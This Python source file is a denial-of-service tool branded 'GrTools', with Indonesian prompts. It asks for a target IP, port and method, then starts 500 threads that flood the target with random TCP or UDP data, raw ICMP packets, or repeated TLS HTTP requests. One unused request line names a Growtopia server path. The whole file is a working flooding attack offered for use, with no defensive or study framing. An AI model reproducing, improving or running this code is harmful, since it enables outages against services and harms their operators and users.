import random

import ctypes

import sys

import datetime

import ssl

import http.client

import threading

import os

import socket

error = 'Error Cant Connecting | ip : {ip} port : {port}'



    # Implementasi fungsi ini

expiration_date = datetime.datetime.now() + datetime.timedelta(days=7)

def is_account_expired():

    current_date = datetime.datetime.now()

    if current_date > expiration_date:

        return True

    else:

        return False

if is_account_expired():

    print("Akun telah kedaluwarsa. Silakan perbarui.")

    exit()

else:

    tampilan = """

    ╔═══╦═══╗    ╔════╦═══╦═══╦╗──╔═══╗

    ║╔═╗║╔═╗║    ║╔╗╔╗║╔═╗║╔═╗║║──║╔═╗║

    ║║─╚╣╚═╝║    ╚╝║║╚╣║─║║║─║║║──║╚══╗

    ║║╔═╣╔╗╔╝      ║║─║║─║║║─║║║─╔╬══╗║

    ║╚╩═║║║╚╗      ║║─║╚═╝║╚═╝║╚═╝║╚═╝║

    ╚═══╩╝╚═╝      ╚╝─╚═══╩═══╩═══╩═══╝

    """

    print(tampilan)

    ip = str(input("GRC2@root~# Enter Target IP : "))

    ip = socket.gethostbyname(ip)

    port = int(input("GRC2@root~# Enter Target PORT : "))

    times = int(input("GRC2@root~# Enter TIME : "))

    print("""

    ┌────────────────────────────────────┐

    │          GrTools Methods           │

    │  [+] TCP                           │

    │  [+] UDP                           │

    │  [+] TLS                           │

    │  [+] TCP-X (SOON)                  │

    └────────────────────────────────────┘

    ┌───────────────────────────────────────┐

       Copyright  GrTools Plan Lifetime

    └───────────────────────────────────────┘

    """)

    method = str(input("GRC2@root~# Enter METHOD : "))

    if method == "UDP" or method == "CPUKILL" or method == "TCP" or method == "TLS":

        def udpby():

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            s.connect((ip, port))

            udpfloodl = os.urandom(10024)

            while datetime.datetime.now() < expiration_date:

                try:

                    s.sendto(udpfloodl, (ip, port))

                    for x in range(times):

                        s.sendto(udpfloodl, (ip, port))

                    print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method UDP Flood ")

                except socket.error:

                    print(f"Error Cant Connecting | ip : {ip} port : {port}")

                    s.close()

        def cpukil():

            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

            s.connect((ip, port))

            cpu = os.urandom(10024)

            while datetime.datetime.now() < expiration_date:

                try:

                    s.sendto(cpu, (ip, port))

                    for x in range(times):

                        s.sendto(cpu, (ip, port))

                    print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method {method} ")

                except socket.error:

                    print(error)

                    s.close()

        def tcpfl():

            grtools = os.urandom(15419) + random._urandom(10414)

            while datetime.datetime.now() < expiration_date:

                try:

                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                    sock.connect((ip, port))

                    sock.send(grtools)

                    for x in range(times):

                        sock.send(grtools)

                    print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method TCP Flood ")

                except socket.error:

                    print(error)

                    sock.close()

        def httpfl():

            while datetime.datetime.now() < expiration_date:

                try:

                    context = ssl.create_default_context()

                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                    ssl_sock = context.wrap_socket(sock)

                    ssl_sock.connect((ip, 443))

                    get_host = "GET /growtopia/server_data.php HTTP/1.1\r\nHost: " + ip + "\r\n"

                    http_request = b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"

                    for x in range(times):

                        ssl_sock.send(http_request)

                    print(f"Sending Packet to > ip : {ip} port : 443 | with time => {times} with Method HTTP Flood ")

                except socket.error:

                    print(f"Error Cant Connecting | ip : {ip} port : 443")

                finally:

                    ssl_sock.close()

        for x in range(500):

            if method == "TCP":

                t = threading.Thread(target=tcpfl)

                t.start()

            elif method == "CPUKILL":

                t = threading.Thread(target=cpukil)

                t.start()

            elif method == "UDP":

                t = threading.Thread(target=udpby)

                t.start()

            elif method == "TLS":

                t = threading.Thread(target=httpfl)

                t.start()

